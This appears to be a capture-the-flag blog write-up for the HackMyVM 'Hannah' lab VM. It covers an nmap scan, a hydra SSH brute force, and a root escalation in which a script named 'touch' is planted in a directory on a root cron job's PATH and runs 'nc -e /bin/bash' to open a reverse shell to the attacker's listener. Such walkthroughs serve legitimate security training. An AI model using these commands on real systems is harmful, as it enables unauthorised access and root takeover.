---
layout: post
title: "HackMyVM - Hannah"
date: 2023-03-24 15:47:00 +0100
categories: hmv
---

Creator: [sml](https://hackmyvm.eu/profile/?user=sml)
Level: Easy
Release Date: 2023-01-05

## Scan

```bash
$ nmap -sC -sV -oA nmap/Hannah -p- 192.168.1.63
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 23:41 WET
Nmap scan report for 192.168.1.63
Host is up (0.00041s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
|_auth-owners: root
| ssh-hostkey: 
|   3072 5f1c78369905320982d3d5054c1475d1 (RSA)
|   256 0669ef979b34d7f3c79660d1a1ffd82c (ECDSA)
|_  256 853dda74b2684ea6f7e5f58540902e9a (ED25519)
80/tcp  open  http    nginx 1.18.0
|_auth-owners: moksha
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
113/tcp open  ident?
|_auth-owners: root
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 161.00 seconds
```

## BruteForce (mkosha)

```bash
$ hydra -l moksha -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.63 -V
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-03-06 23:49:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.63:22/
[22][ssh] host: 192.168.1.63   login: moksha   password: h****h
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-06 23:49:44
```

```bash
$ ssh moksha@192.168.1.63
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
moksha@hannah:~$ 
```

## Priviledge Escalation

```ascii
moksha@hannah:/tmp$ ./linpeas.sh 

...[REDACTED]

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

...[REDACTED]

```

## ROOT

```xterm
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

* * * * * root touch /tmp/enlIghtenment
```

* /media/touch

```bash
#!/bin/bash
nc -e /bin/bash 192.168.1.6 4444
```

* Local

```bash
$ nc -lvnp 4444                                
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.63] 35432
id
uid=0(root) gid=0(root) grupos=0(root)
```